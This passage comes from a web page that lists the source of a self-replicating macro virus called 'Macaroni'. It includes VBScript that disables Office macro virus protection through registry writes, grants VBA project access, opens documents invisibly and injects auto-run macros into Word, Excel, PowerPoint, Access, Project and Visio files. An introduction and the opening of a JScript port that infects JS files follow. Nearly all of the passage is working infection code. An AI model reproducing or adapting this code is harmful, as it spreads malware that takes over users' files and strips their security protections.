&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> q=0then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'if matches quotes then use entire line<br/>
</span> &nbsp; &nbsp;r=j<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; s=instrrev(p,j) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'else find last closing quote<br/>
</span> &nbsp; &nbsp;t=instrrev(p,<span style="color: #800000;">&quot; &quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'or find last space, whichever occurs last<br/>
</span> &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> s&lt;t <span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; s=t<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; p=left(p,s)<br/>
&nbsp; &nbsp; o=s<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; m=left(m,n-1)+p+r+<span style="color: #800000;">&quot;+ _&quot;</span>+l+r+mid(m,n+o) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'split line at special character or near 1024 bytes boundary<br/>
</span> &nbsp;n=n+o-q+6<br/>
<span style="color: #8D38C9; font-weight: bold;">loop</span> <span style="color: #8D38C9; font-weight: bold;">while</span> o&gt;0<br/>
m=left(m,len(m)-12)+l+<span style="color: #800000;">&quot;print #1,c:close #1:createobject(&quot;</span>+j+<span style="color: #800000;">&quot;wscript.shell&quot;</span>+j+<span style="color: #800000;">&quot;).run&quot;</span>+k+<span style="color: #800000;">&quot;,0&quot;</span>+l<br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> h=2then<br/>
&nbsp; m=m+<span style="color: #800000;">&quot;activepresentation.slideshowwindow.view.next&quot;</span>+l<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'add code to move to next PowerPoint slide<br/>
</span><span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> n=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;wscript.shell&quot;</span>)<br/>
o=<span style="color: #800000;">&quot;HKCU\software\microsoft\&quot;</span><br/>
p=o+<span style="color: #800000;">&quot;office\8.0\&quot;</span><br/>
q=<span style="color: #800000;">&quot;REG_SZ&quot;</span><br/>
n.regwrite p+<span style="color: #800000;">&quot;Word\Options\EnableMacroVirusProtection&quot;</span>,0,q<br/>
n.regwrite p+<span style="color: #800000;">&quot;MS Project\Options\General\Macro Virus Protection&quot;</span>,<span style="color: #800000;">&quot;No&quot;</span>,q<br/>
q=<span style="color: #800000;">&quot;REG_DWORD&quot;</span><br/>
n.regwrite p+<span style="color: #800000;">&quot;Excel\Microsoft Excel\Options6&quot;</span>,0,q<br/>
n.regwrite p+<span style="color: #800000;">&quot;PowerPoint\Options\MacroVirusProtection&quot;</span>,0,q<br/>
p=b(h)<br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> h=4then<br/>
&nbsp; p=<span style="color: #800000;">&quot;MS &quot;</span>+p<br/>
<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> h&lt;&gt;6then<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> r=9to 12<br/>
&nbsp; &nbsp; s=o<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h&lt;&gt;5then<br/>
&nbsp; &nbsp; &nbsp; s=s+<span style="color: #800000;">&quot;Office\&quot;</span>+cstr(r)+<span style="color: #800000;">&quot;.0\&quot;</span><br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; s=s+p+<span style="color: #800000;">&quot;\Security\&quot;</span><br/>
&nbsp; &nbsp; n.regwrite s+<span style="color: #800000;">&quot;Level&quot;</span>,1,q<br/>
&nbsp; &nbsp; n.regwrite s+<span style="color: #800000;">&quot;AccessVBOM&quot;</span>,1,q<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> n=f.getfolder(<span style="color: #800000;">&quot;.&quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'demo version, current directory only<br/>
</span><span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> o <span style="color: #8D38C9; font-weight: bold;">in</span> n.files<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(f.getextensionname(o))=a(h)<span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; o=o.path<br/>
&nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=f.opentextfile(o,8)<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; r=<span style="color: #800000;">&quot;sub &quot;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=6then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> instr(f.opentextfile(o).readall,e)=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.write l+c(6)+l+r+c(6)+l+g+l+<span style="color: #800000;">&quot;end &quot;</span>+r<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=5then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=<span style="color: #E56717; font-weight: bold;">createobject</span>(p+<span style="color: #800000;">&quot;.invisibleapp&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=4then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p=<span style="color: #800000;">&quot;MS&quot;</span>+b(h)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=<span style="color: #E56717; font-weight: bold;">createobject</span>(p+<span style="color: #800000;">&quot;.application&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.visible=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.application.automationsecurity=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=q.documents<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=q.workbooks<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=q.presentations<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.opencurrentdatabase(o)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=4then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.fileopen(o)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=q.activeproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=2then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.visible=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint window is not allowed to be hidden<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> s=s.<span style="color: #151B8D; font-weight: bold;">open</span>(o)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=q.vbe.activevbproject.vbcomponents(i).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=s.vbproject.vbcomponents(i).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t=<span style="color: #800000;">&quot;_open&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=5then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t=<span style="color: #800000;">&quot;_&quot;</span>+c(0)+<span style="color: #800000;">&quot;opened&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t=c(h)+t<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o=o.proccountlines(t,0) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'infection marker is presence of code in module of our name<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> err.number&gt;0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=2then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'PowerPoint does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.vbproject.vbcomponents.add(1).name=i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> q.vbe.activevbproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .vbcomponents.add(1).name=i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=.vbcomponents(i).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=s.vbproject.vbcomponents(i).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s=<span style="color: #800000;">&quot;private &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=2or h=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s=<span style="color: #800000;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r=<span style="color: #800000;">&quot;function &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.addfromstring(s+r+t+<span style="color: #800000;">&quot;(&quot;</span>+d(h)+<span style="color: #800000;">&quot;)&quot;</span>+m+<span style="color: #800000;">&quot;end &quot;</span>+r)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'all but PowerPoint and Access activation is auto-macro<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> q.activepresentation &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint activation is via AutoShape click action<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> .slidemaster<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=.shapes.addshape(1,0,0,.width,.height)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.fill.transparency=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">with</span> o.actionsettings(1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .action=8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .run=t<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .<span style="color: #8D38C9; font-weight: bold;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access activation is via form open<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;q.docmd.openform q.currentproject.allforms(0).name,1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.forms(0).onopen=<span style="color: #800000;">&quot;=&quot;</span>+t+<span style="color: #800000;">&quot;()&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.docmd.save 5,i<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.activedocument.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.activeworkbook.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.filesave<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q.fileclose<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> h&lt;&gt;2and h&lt;&gt;4then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint and Project are single-instance<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;q.quit<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><span style="color: black; font-style: italic;">'' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'double quote to mark end of code<br/>
</span></div>
<p>Now is JScript version. JScript code is a bit different because of no "on error"-alike code. We must use the try...catch blocks instead to trap errors if they occur. Another important difference is that in JScript, no error occurs when trying to assign a not-existing collection to a variable. What happens instead is that the variable is assigned a null value, so this case must be checked, instead of assuming that no change is made, as in VBScript. The code also infects JS files instead of VBS files.</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #006600; font-style: italic;">/*Macaroni - roy g biv 05/02/05*/</span><br/>
a<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> <span style="">Array</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;doc&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;xls&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;ppt&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;mdb&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;mpp&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;vsd&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><br/>
b<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> <span style="">Array</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Word&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;Excel&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;PowerPoint&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;Access&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;Project&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;Visio&quot;</span><span style="color: black;">&#41;</span><br/>
c<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> <span style="">Array</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Document&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;WorkBook&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;p&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;d&quot;</span><span style="color: #339933;">,</span>b<span style="color: black;">&#91;</span><span style="color: #CC0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;Macaroni&quot;</span><span style="color: black;">&#41;</span><br/>
y<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;byval z as &quot;</span><br/>
d<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> <span style="">Array</span><span style="color: black;">&#40;</span>e<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><span style="color: #339933;">,</span>e<span style="color: #339933;">,</span>e<span style="color: #339933;">,</span>e<span style="color: #339933;">,</span>y<span style="color: #339933;">+</span>b<span style="color: black;">&#91;</span><span style="color: #CC0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>y<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;iv&quot;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span>c<span style="color: black;">&#91;</span><span style="color: #CC0000;">5</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span>c<span style="color: black;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
e<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;scripting.filesystemobject&quot;</span><span style="color: black;">&#41;</span><br/>
f<span style="color: #339933;">=</span>e.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>WScript.<span style="color: #660066;">scriptfullname</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
f<span style="color: #339933;">=</span>f.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>f.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span>g<span style="color: #339933;">=</span><span style="color: #009966; font-style: italic;">/\/\*Mac/</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
f<span style="color: #339933;">=</span>f.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span>f.<span style="color: #660066;">lastendexOf</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;//&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><br/>
with<span style="color: black;">&#40;</span><span style="">Math</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; random<span style="color: black;">&#40;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; h<span style="color: #339933;">=</span>round<span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">7</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#125;</span><br/>
i<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;This&quot;</span><span style="color: #339933;">+</span>c<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><br/>
j<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\&quot;</span>&quot;</span><br/>
k<span style="color: #339933;">=</span>j<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;m.js&quot;</span><span style="color: #339933;">+</span>j &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//our export filename</span><br/>
l<span style="color: #339933;">=</span><span style="color: #009966; font-style: italic;">/&quot;/g</span><br/>
m<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
